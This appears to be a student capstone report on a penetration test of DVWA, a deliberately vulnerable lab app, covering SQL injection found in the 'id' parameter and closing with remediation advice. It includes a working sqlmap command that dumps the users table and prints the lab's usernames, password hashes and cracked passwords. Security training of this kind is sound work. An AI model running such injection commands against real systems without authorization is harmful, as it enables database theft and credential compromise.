# Capstone Project – Web Application VAPT (DVWA)
## Objective

To perform a complete Web Application Vulnerability Assessment and Penetration Test (VAPT) against a deliberately vulnerable application in a controlled lab environment, following standard penetration testing methodology.

Target Environment

Application: Damn Vulnerable Web Application (DVWA)

Security Level: Low

Web Server: Apache 2.4.7

Backend DBMS: MySQL

Operating System: Linux Ubuntu

Testing Platform: Kali Linux

Vulnerability Identified

The application was found vulnerable to SQL Injection due to improper input validation and the absence of parameterized SQL queries on the id parameter within the SQL Injection module.

Exploitation

The identified SQL Injection vulnerability was successfully exploited using sqlmap by replaying an authenticated session cookie.
During exploitation, sqlmap automatically detected and confirmed multiple SQL injection techniques, including:

Boolean-based blind SQL Injection

Error-based SQL Injection

Time-based blind SQL Injection

UNION-based SQL Injection

This confirmed that the application backend was fully injectable and vulnerable.

Impact

Successful exploitation enabled:

Enumeration of available databases

Identification of the dvwa database

Extraction of sensitive data from the users table

Retrieval of usernames and corresponding password hashes

This demonstrates a high-risk data exposure scenario, which could lead to unauthorized access, credential reuse attacks, and complete compromise of the application.

### Evidence
```
sqlmap -u "http://10.48.143.180/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=6f40tga2903lg13e1jrqj2s00" \
-D dvwa -T users --dump
```

Injection Point Identified:

Parameter: id (GET)

Backend DBMS: MySQL ≥ 5.0

Web Technology: Apache 2.4.7, PHP 5.5.9

OS: Linux Ubuntu

Extracted Table: dvwa.users

| user_id | user    | avatar                      | password                                    |
-------------------------------------------------------------------------------------------------
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |

Remediation Recommendations

Implement prepared statements (parameterized queries)

Apply strict server-side input validation and sanitization

Enforce least-privilege database access

Enable Web Application Firewall (WAF) protection

Increase application security level and conduct regular security testing

Non-Technical Summary

The security assessment identified a critical vulnerability that allows attackers to access sensitive information stored in the application database. By exploiting improper input handling, an attacker can retrieve usernames and passwords without authorization. This type of vulnerability poses serious risks, including data breaches and system compromise. Applying secure coding practices and regular security testing will significantly reduce these risks and strengthen the application’s overall security posture.

Conclusion

This capstone project successfully demonstrates a full VAPT cycle, including vulnerability identification, exploitation, evidence collection, impact analysis, and remediation planning. The exercise highlights the importance of secure development practices and proactive security assessments.
